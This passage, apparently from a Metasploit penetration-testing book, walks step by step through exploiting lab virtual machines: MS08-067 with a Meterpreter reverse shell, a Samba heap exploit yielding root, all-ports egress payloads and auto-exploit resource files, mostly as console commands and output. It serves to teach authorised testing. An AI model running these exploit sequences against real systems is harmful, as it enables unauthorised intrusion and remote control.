+   1   Windows 2000 Universal   2   Windows XP SP0/SP1 Universal   3   Windows XP SP2 English (NX)   4   Windows XP SP3 English (NX)   5   Windows 2003 SP0 Universal   6   Windows 2003 SP1 English (NO NX)   7   Windows 2003 SP1 English (NX)   8   Windows 2003 SP2 English (NO NX)
+   9   Windows 2003 SP2 English (NX)
+In this example, you can see that the exploit lists Automatic Targeting X 
+as one option. Often, an exploit module  will attempt to target the operating 
+system automatically based on its versio n and select an exploit based on the 
+system’s fingerprint. However, it’s often best to try to identify the appropriate 
+exploit yourself to avoid triggering th e wrong exploit or a potentially destruc-
+tive one.
+NOTE This particular exploit is temperamental, an d it has a tough time determining the oper-
+ating system. If you use this exploit, be sure to  set the target as the specific operating system 
+you use in testing on your VM (Windows XP SP2).
+
+The Joy of Exploitation 63info
+When the short description of a module provided by the show and search  com-
+mands isn’t sufficient, use the info command followed by the module name 
+to display all the information, options,  and targets available for that module:
+msf exploit(ms08_067_netapi) > info
+set and unset
+All the options for a given Metasploit mo dule must be either set or unset, 
+especially if they are marked as required  or yes. When you enter show options , 
+you will see information that specifie s whether a field is required. Use the set 
+command to set an option (turn it on); use unset  to turn a setting off. The 
+next listing shows the set and unset  commands in use.
+NOTE Notice that the variables are referenced usin g uppercase characters. This isn’t required, 
+but it is considered good practice.
+msf exploit(ms08_067_netapi) > set RHOST 192.168.1.155 X
+RHOST => 192.168.1.155msf exploit(ms08_067_netapi) > set TARGET 3 Y
+TARGET => 3msf exploit(ms08_067_netapi) > show options Z
+Module options:   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------   RHOST    192.168.1.155    yes       The target address   RPORT    445              yes       Set the SMB service port   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
+Exploit target:   Id  Name
+   --  ----   3   Windows XP SP2 English (NX)
+msf exploit(ms08_067_netapi) > unset RHOST
+Unsetting RHOST...
+At X we set the target IP address ( RHOST ) to 192.168.1.155  (our target 
+machine). At Y we set the target to 3, the “Windows XP SP2 English (NX)” 
+that we listed with show targets  in “msf> show targets” on page 62. Running 
+show options  at Z confirms that our settings have  been populated, as shown in 
+the Module options  output.
+
+64 Chapter 5setg and unsetg
+The setg and unsetg  commands are used to set or unset a parameter globally 
+within msfconsole . Using these commands can save you from having to re-enter 
+the same information repeatedly, particul arly in the case of frequently used 
+options that rarely change, such as LHOST .
+save
+Having configured global options with the setg command, use the save com-
+mand to save your current settings so th ey will be availabl e next time you run 
+the console. You can enter the save command at any time  in Metasploit to 
+save your current place.
+msf exploit(ms08_067_netapi) > save
+Saved configuration to: /root/.msf3/config
+msf exploit(ms08_067_netapi) >
+The location in which the configuration is stored, /root/.msf3/config , is 
+shown on the screen. If for some reason you need to start over, move or delete this file to revert to the default settings.
+Exploiting Your First Machine
+With some of the basics behind us and an understanding of how to set vari-ables within msfconsole , let’s exploit our first machine. To do so, fire up your 
+Windows XP Service Pack 2 and Ubuntu 9.04 virtual machines. We’ll use Metasploit from wi thin Back|Track. 
+If you used the vulnerability scanners  discussed in Chapter 4 against your 
+virtual Windows XP SP2 machine, you will have encountered the vulnerabil-
+ity we’ll exploit in this chapter: the MS08-067 exploit. We’ll begin by finding this vulnerability on our own. 
+As your skills as a penetration tester  improve, the discovery of certain 
+open ports will trigger ideas about how you might exploit a particular service. 
+One of the best ways to conduct this check is by using nmap ’s script options 
+within Metasploit as shown here:
+root@bt:/root# cd /opt/framework3/msf3/
+root@bt:/opt/framework3/msf3# msfconsole
+. . . SNIP . . .msf > nmap -sT -A --script=smb-check-vulns -P0 192.168.33.130 X
+[*] exec: nmap -sT -A --script=smb-check-vulns -P0 192.168.33.130
+Starting Nmap 5.20 ( http://nmap.org ) at 2011-03-15 19:46 EDT
+Warning: Traceroute does not support idle or connect scan, disabling...NSE: Script Scanning completed.Nmap scan report for 192.168.33.130Host is up (0.00050s latency).Not shown: 991 closed ports
+
+The Joy of Exploitation 65PORT     STATE SERVICE      VERSION
+21/tcp   open  ftp          Microsoft ftpd25/tcp   open  smtp         Microsoft ESMTP 6.0.2600.218080/tcp   open  http         Microsoft IIS webserver 5.1135/tcp  open  msrpc        Microsoft Windows RPC139/tcp  open  netbios-ssn443/tcp  open  https?445/tcp  open  microsoft-ds Microsoft Windows XP microsoft-ds1025/tcp open  msrpc        Microsoft Windows RPC1433/tcp open  ms-sql-s     Microsoft SQL Server 2005 9.00.1399; RTMMAC Address: 00:0C:29:EA:26:7C (VMware)Device type: general purposeRunning: Microsoft Windows XP|2003OS details: Microsoft Windows XP Professional SP2 or Windows Server 2003  Z
+Network Distance: 1 hopService Info: Host: ihazsecurity; OS: Windows
+Host script results:
+ smb-check-vulns:   MS08-067: VULNERABLE  Y
+   Conficker: Likely CLEAN   regsvc DoS: CHECK DISABLED (add '--script-args=unsafe=1' to run)   SMBv2 DoS (CVE-2009-3103): CHECK DISABLED (add '--script-args=unsafe=1' to run)
+OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 71.67 seconds
+msf >
+Here, we call nmap  from Metasploit with the --script=smb-check-vulns  
+plug-in at X. Notice the flags used whil e scanning the host with nmap . The 
+-sT is a Stealth TCP connect, which we have  found to be the most reliable flag 
+when trying to enumerate ports. (Others prefer -sS, or Stealth Syn.) The -A 
+specifies advanced OS detection, whic h does some additional banner grabs 
+and footprinting of a specific service for us.
+Notice in the results from nmap  that MS08-067: VULNERABLE  is reported at Y. 
+This is a good indicator that we have a ch ance at exploiting this system. Let’s use 
+Metasploit to find the exploit we want  and attempt to compromise the system. 
+This exploit is specific to the operat ing system version, service pack, and 
+language in use on the system, a result of the exploit bypassing Data Execution 
+Prevention (DEP). DEP wa s created to help protect against buffer overflow 
+attacks by rendering the stack read-onl y and thereby preventing arbitrarily 
+placed shellcode from executing. Ho wever, we can bypass DEP and force 
+Windows to make the stack writable by performing some complex stack manipulation. (For more on bypassing DEP, see http://www.uninformed.org/
+?v=2&a=4 .)
+In “msf> show targets” on page 62, we used the 
+show targets  command, 
+which lists each vulnerable version for this specific attack vector. Because 
+MS08-067 is an exploit that is very specific regarding the OS version in use, we will manually set our target to make  sure we trigger the correct overflow. 
+Based on the nmap  scan results shown in the preceding example, we can 
+tell at Z that the system is running Window s XP Service Pack 2. (It is also 
+
+66 Chapter 5identified as possibly Windows 2003, but the system is missing key ports that 
+would be associated with the Server Edit ion.) We’ll assume that our target is 
+running the English version of XP.
+Let’s walk through the actual exploitation. First the setup:
+msf > search ms08_067_netapi X
+[*] Searching loaded modules for pattern 'ms08_067_netapi'...
+Exploits
+========
+   Name                         Rank   Description
+   ----                         ----   -----------   windows/smb/ms08_067_netapi  great  Microsoft Server Service Relative Path Stack 
+Corruption
+msf > use windows/smb/ms08_067_netapi Y
+msf exploit(ms08_067_netapi) > set PAYLOAD windows/meterpreter/reverse_tcp Z
+payload => windows/meterpreter/reverse_tcpmsf exploit(ms08_067_netapi) > show targets [
+Exploit targets:   Id  Name
+   --  ----   0   Automatic Targeting   1   Windows 2000 Universal   2   Windows XP SP0/SP1 Universal   3   Windows XP SP2 English (NX) \
+   4   Windows XP SP3 English (NX)   5   Windows 2003 SP0 Universal   6   Windows 2003 SP1 English (NO NX)   7   Windows 2003 SP1 English (NX)   8   Windows 2003 SP2 English (NO NX)   9   Windows 2003 SP2 English (NX)
+. . . SNIP . . .   26  Windows XP SP2 Japanese (NX). . . SNIP . . .msf exploit(ms08_067_netapi) > set TARGET 3
+target => 3msf exploit(ms08_067_netapi) > set RHOST 192.168.33.130 ]
+RHOST => 192.168.33.130msf exploit(ms08_067_netapi) > set LHOST 192.168.33.129 ^
+LHOST => 192.168.33.129msf exploit(ms08_067_netapi) > set LPORT 8080 _
+LPORT => 8080msf exploit(ms08_067_netapi) > show options `
+
+The Joy of Exploitation 67Module options:
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------   RHOST    192.168.33.130   yes       The target address   RPORT    445              yes       Set the SMB service port   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
+Payload options (windows/meterpreter/reverse_tcp):
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------   EXITFUNC  thread           yes       Exit technique: seh, thread, process   LHOST     192.168.33.129   yes       The local address   LPORT     8080             yes       The local port
+Exploit target:   Id  Name
+   --  ----
+   3   Windows XP SP2 English (NX)
+We search for the MS08-067 NetA PI exploit in the Framework at X. 
+Then, having found our exploit, we load the windows/smb/ms08_067_netapi  
+exploit at Y.
+Next, at Z we set the payload as Windows-based Meterpreter reverse_tcp , 
+which, if successful, will start a co nnection on the target machine and con-
+nect back to the attackin g machine specified with LHOST . This is important if 
+you find that a firewall is in place an d you need to bypass incoming controls 
+on a firewall or NAT.
+Meterpreter  is a post exploitation tool that  we’ll use through this book. One 
+of Metasploit’s flagship tools, it ma kes extracting information or further 
+compromising systems significantly easier.
+The show targets  command at [ allows us to identify the system we want 
+to target. (Although many MSF exploi ts use automatic targeting and don’t 
+require this flag, autodetection capa bility generally fails in MS08-067.)
+We then set our target to Windows XP SP2 English (NX)  at \. The NX stands 
+for No Execute. By default in Windows XP SP2, DEP is enabled.
+At ] we set the IP address of our targ et machine which, by defining the 
+RHOST  value, is vulnerable to the MS08-067 exploit. 
+The set LHOST  command at ^ specifies our attacking machine’s IP address 
+(the Back|Track machine), and the LPORT  option at _ specifies the port to 
+which our attacker machine will listen fo r a connection from our target. (When 
+you’re setting the LPORT  option, use a standard port that you think will be 
+allowed through the firewall: Ports 443, 80, 53, and 8080 are often good options.) Finally, we enter 
+show options  at ` to make sure that the options are 
+set up correctly. 
+
+68 Chapter 5Having set the stage, we’re ready to  conduct the actu al exploitation:
+msf exploit(ms08_067_netapi) > exploit X
+[*] Started reverse handler on 192.168.33.129:8080[*] Triggering the vulnerability...[*] Sending stage (748032 bytes)[*] Meterpreter session 1 opened (192.168.33.129:8080 -> 192.168.33.130:1487) Y
+msf exploit(ms08_067_netapi) > sessions -l Z
+Active sessions
+===============
+  Id  Type         Information  Connection
+  --  ----         -----------  ----------  1   meterpreter               192.168.33.129:8080 -> 192.168.33.130:1036 [
+msf exploit(ms08_067_netapi) > sessions -i 1 \
+[*] Starting interaction with 1...
+meterpreter > shell ]
+Process 4060 created.Channel 1 created.Microsoft Windows XP [Version 5.1.2600](C) Copyright 1985-2001 Microsoft Corp.
+C:\WINDOWS\system32>
+The exploit  command at X initiates our exploit and attempts to attack 
+the target. The attack succeeds and gives us a reverse_tcp  Meterpreter pay-
+load at Y, which we can view with sessions -l  at Z. Only one session is active, 
+as shown at [, but if we targeted multiple sy stems, several sessions could be 
+open simultaneously. (To view a list of the exploits that created each session, 
+you would enter sessions -l -v .)
+The sessions -i 1  command is issued at \ to “interact” with an individual 
+session. Notice that this drops us into a Meterpreter shell. If, for example, a 
+reverse command shell existed, this co mmand would drop us straight to a 
+command prompt. And, finally, at ] we enter shell  to jump into an interac-
+tive command shell on the target. 
+Congratulations! You’ve just compromi sed your first machine! To list the 
+available commands for a partic ular exploit, you can enter show options .
+Exploiting an Ubuntu Machine
+Let’s try a different exploit on an Ubun tu 9.04 virtual machine. The steps are 
+pretty much the same as for the precedin g exploit except that we will select a 
+different payload.
+msf > nmap -sT -A -P0 192.168.33.132
+[*] exec: nmap -sT -A -P0 192.168.33.132
+
+The Joy of Exploitation 69Starting Nmap 5.20 ( http://nmap.org ) at 2011-03-15 19:35 EDT
+Warning: Traceroute does not support idle or connect scan, disabling...Nmap scan report for 192.168.33.132Host is up (0.00048s latency).Not shown: 997 closed portsPORT    STATE SERVICE     VERSION80/tcp  open   http        Apache httpd 2.2.3 (( Ubuntu) PHP/5.2.1) X
+|_html-title: Index of /139/tcp open   netbios-ssn Samba smbd 3.X (workgroup: MSHOME) Y
+445/tcp open   netbios-ssn Samba smbd 3.X (workgroup: MSHOME)
+MAC Address: 00:0C:29:21:AD:08 (VMware)No exact OS matches for host (If you know what OS is running on it, see http://nmap.org/submit/ ).
+. . . SNIP . . .Host script results:
+|_nbstat: NetBIOS name: UBUNTU, NetBIOS user: <unknown>, NetBIOS MAC: <unknown>|_smbv2-enabled: Server doesn't support SMBv2 protocol| smb-os-discovery:|   OS: Unix (Samba 3.0.24)|   Name: MSHOME\Unknown|_  System time: 2011-03-15 17:39:57 UTC-4
+OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 47.11 seconds
+We see three open ports: 80, 139, and 445. The message at X tells us that 
+the system is running Ubuntu, and at Y we see that it is running a version of 
+Samba 3. x and Apache 2.2.3 with PHP 5.2.1.
+Let’s search for a Samba exploit and try it against the system:
+msf > search samba
+[*] Searching loaded modules for pattern 'samba'...
+Auxiliary
+=========   Name                               Rank    Description   ----                               ----    -----------   admin/smb/samba_symlink_traversal  normal  Samba Symlink Directory Traversal   dos/samba/lsa_addprivs_heap        normal  Samba lsa_io_privilege_set Heap Overflow   dos/samba/lsa_transnames_heap      normal  Samba lsa_io_trans_names Heap  Overflow
+Exploits
+========
+   Name                                 Rank       Description
+   ----                                 ----       -----------   linux/samba/lsa_transnames_heap      good       Samba lsa_io_trans_names . . .
+. . . SNIP . . .msf > use linux/samba/lsa_transnames_heap
+msf exploit(lsa_transnames_heap) > show payloads
+
+70 Chapter 5Compatible Payloads
+===================
+   Name                              Rank    Description
+   ----                              ----    -----------
+   generic/debug_trap                normal  Generic x86 Debug Trap
+   generic/shell_bind_tcp            normal  Generic Command Shell, Bind TCP Inline   generic/shell_reverse_tcp         normal  Generic Command Shell, Reverse TCP Inline
+   linux/x86/adduser                 normal  Linux Add User
+   linux/x86/chmod                   normal  Linux Chmod   linux/x86/exec                    normal  Linux Execute Command
+   linux/x86/metsvc_bind_tcp         normal  Linux Meterpreter Service, Bind TCP
+   linux/x86/metsvc_reverse_tcp      normal  Linux Meterpreter Service, Reverse TCP Inline   linux/x86/shell/bind_ipv6_tcp     normal  Linux Command Shell, Bind TCP Stager (IPv6)
+   linux/x86/shell/bind_tcp          normal  Linux Command Shell, Bind TCP Stager
+. . . SNIP . . .msf exploit(lsa_transnames_heap) > set payload linux/x86/shell_bind_tcp
+payload => linux/x86/shell_bind_tcp
+msf exploit(lsa_transnames_heap) > set LPORT 8080
+LPORT => 8080
+msf exploit(lsa_transnames_heap) > set RHOST 192.168.33.132
+RHOST => 192.168.33.132msf exploit(lsa_transnames_heap) > exploit
+[*] Creating nop sled....
+[*] Started bind handler
+[*] Trying to exploit Samba with address 0xffffe410...[*] Connecting to the SMB service...
+. . . SNIP . . .  
+[*] Calling the vulnerable function...
+[+] Server did not respond, this is expected
+[*] Command shell session 1 opened (192.168.33.129:41551 -> 192.168.33.132:8080)
+ifconfigeth1      Link encap:Ethernet  HWaddr 00:0C:29:21:AD:08
+          inet addr:192.168.33.132  Bcast:192.168.33.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1          RX packets:3178 errors:0 dropped:0 overruns:0 frame:0          TX packets:2756 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000
+          RX bytes:292351 (285.4 KiB)  TX bytes:214234 (209.2 KiB)          Interrupt:17 Base address:0x2000
+lo        Link encap:Local Loopback
+          inet addr:127.0.0.1  Mask:255.0.0.0          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0          collisions:0 txqueuelen:0
+          RX bytes:0 (0.0 b)  TX bytes:0 (0.0 b)
+whoami
+root
+
+The Joy of Exploitation 71This type of exploit, called a heap-based attack , takes advantage of dynamic 
+memory allocation, but it isn’t 100 percen t reliable. (You may need to attempt 
+the exploit  command a few times if it doesn’t work the first time.)
+Notice in this example that we used a bind shell to set up a listener port 
+on the target machine; Metasploit handle s the direct connection to the system 
+automatically for us. (Remember to us e the reverse payload when attacking 
+through a firewall or NAT.)
+All-Ports Payloads: Brute Forcing Ports
+In the preceding examples, we’ve relied  on the reverse port always being 
+open. But what if we’re attacking an organization with very strict egress port filtering? Most companie s block outbound connections except those from a 
+few defined ports, and it can be diffic ult to determine which ports can make 
+outbound connections.
+We can guess that port 443 won’t be  inspected and will allow a TCP con-
+nection out, and that FTP, Telnet, SS H, and HTTP may be allowed. But why 
+guess when Metasploit has a very specific  payload for use in finding open ports? 
+Metasploit’s payload will try every available port until it finds an open 
+one. (Going through the entire port range [1–65535] can take quite a long 
+time, however.)
+Let’s use this payload and have it tr y all ports connecting outbound until 
+we get one that is successful:
+msf > use windows/smb/ms08_067_netapi
+msf exploit(ms08_067_netapi) > set LHOST 192.168.33.129
+lhost => 192.168.33.129
+smsf exploit(ms08_067_netapi) > set RHOST 192.168.33.130
+rhost => 192.168.33.130msf exploit(ms08_067_netapi) > set TARGET 3
+target => 3msf exploit(ms08_067_netapi) > search ports
+[*] Searching loaded modules for pattern 'ports'...
+Compatible Payloads
+===================
+   Name                                Rank    Description
+   ----                                   ----    -----------
+   windows/dllinject/reverse_tcp_allports normal  Reflective Dll Injection,
+Reverse All-Port TCP Stager
+   windows/meterpreter/reverse_tcp_allports  normal  Windows Meterpreter (Reflective
+Injection), Reverse All-Port TCP Stager
+. . . SNIP . . .
+msf exploit(ms08_067_netapi) > set PAYLOAD windows/meterpreter/reverse_tcp_allports
+payload => windows/meterpreter/reverse_tcp_allportsmsf exploit(ms08_067_netapi) > exploit -j
+[*] Exploit running as background job.
+
+72 Chapter 5msf exploit(ms08_067_netapi) >
+[*] Started reverse handler on 192.168.33.129:1 X
+[*] Triggering the vulnerability...[*] Sending stage (748032 bytes)
+[*] Meterpreter session 1 opened (192.168.33.129:1 -> 192.168.33.130:1047) Y
+msf exploit(ms08_067_netapi) > sessions -l -v
+Active sessions
+===============
+  Id  Type         Information                         Connection                               Via
+  --  ----         -----------                         ----------                               ---
+  1   meterpreter  NT AUTHORITY\SYSTEM @ IHAZSECURITY  192.168.33.129:1 -> 192.168.33.130:1047  
+exploit/windows/smb/ms08_067_netapi
+msf exploit(ms08_067_netapi) > sessions -i 1
+[*] Starting interaction with 1...
+meterpreter >
+Notice that we do not set an LPORT ; instead, we use allports  because we 
+are going to try to connect out of the network on each port until we find an open one. If you look closely at X you will see that our attacker machine is 
+bound to 
+:1 (all ports) and that it find s a port outbound on port 1047 Y on 
+the target network.
+Resource Files
+Resource files  are script files that automate commands within msfconsole . They 
+contain a list of commands that are executed from msfconsole  and run sequen-
+tially. Resource files can greatly reduce  testing and development times, allow-
+ing you to automate many repetitive tasks, including exploitation.
+Resource files can be loaded from msfconsole  with the resource  command, or 
+they can be passed as a command-line argument with the -r switch.
+The simple example shown next creates a resource file that displays our 
+Metasploit version and then  loads the sounds plug-in:
+root@bt:/opt/framework3/msf3/ echo version > resource.rc X
+root@bt:/opt/framework3/msf3/ echo load sounds >> resource.rc  Y
+root@bt:/opt/framework3/msf3/ msfconsole -r resource.rc  Z
+[ resource (resource.rc)> version
+Framework: 3.7.0-dev.12220
+Console  : 3.7.0-dev.12220
+resource (resource.rc)> load sounds[*] Successfully loaded plugin: sounds
+msf >
+As you can see at X and Y, the version  and load sounds  commands are 
+echoed into a text file called resource.rc . This file is then passed to msfconsole  at 
+the command line at Z with the -r switch, and when the file begins to load, the 
+commands are executed at [ from the resource file.
+
+The Joy of Exploitation 73A more complex resource file might au tomatically run a particular exploit 
+against a machine in your lab environmen t. For example, the following listing 
+uses an SMB exploit in a newl y created resource file called autoexploit.rc . We 
+set a payload and our attack and target IPs in this one file so that we don’t have to specify these options manual ly when attempti ng this exploit.
+root@bt:/opt/fra mework3/msf3/ echo use exploit/windows/smb/ms08_067_netapi > autoexploit.rc
+root@bt:/opt/fra mework3/msf3/ echo set RHOST 192.168.1.155 >> autoexploit.rc
+root@bt:/opt/fra mework3/msf3/ echo set PAYLOAD windows/meterpreter/reverse_tcp >> autoexploit.rc
+root@bt:/opt/fra mework3/msf3/ echo set LHOST 192.168.1.101 >> autoexploit.rc
+root@bt:/opt/fra mework3/msf3/ echo exploit >> autoexploit.rc
+root@bt:/opt/fra mework3/msf3/ msfconsole
+msf > resource autoexploit.rc
+resource (autoexploit.rc) X> use exploit/windows/smb/ms08_067_netapi
+resource (autoexploit.rc)> set RHOST 192.168.1.155RHOST => 192.168.1.155resource (autoexploit.rc)> set PAYLOAD windows/meterpreter/reverse_tcpPAYLOAD => windows/meterpreter/reverse_tcpresource (autoexploit.rc)> set LHOST 192.168.1.101LHOST => 192.168.1.101resource (autoexploit.rc)> exploit
+[*] Started reverse handler on 192.168.1.101:4444
+[*] Triggering the vulnerability...[*] Sending stage (747008 bytes)[*] Meterpreter session 1 opened (192.168.1.101:4444 -> 192.168.1.155:1033)
+meterpreter >
+Here we specify the resource file within msfconsole , and it automatically 
+runs our specified commands as shown by the output displayed at X.
+NOTE These are just a couple of simple examples . In Chapter 12, you will learn how to use 
+karma , a very large resource file.
+Wrapping Up
+You’ve just exploited your first machine and gained full access to it with 
+msfconsole . Congratulations! 
+We began this chapter by covering the basics of exploitation and com-
+promising a target based on a discovered  vulnerability. Exploitation is about 
+identifying a system’s potential exposu res and exploiting its weaknesses. We 
+used nmap  to identify potentially vulnerable  services. From th ere we launched 
+an exploit that gave us access to a system. 
+In the next chapter, we will explore Meterpreter in more detail as we 
+learn how to use it in post exploitation . You will find Meterpreter to be an 
+amazing tool once you’ve compromised a system. 
+
+
+[Note: PDF has 332 pages, only first 100 pages extracted]
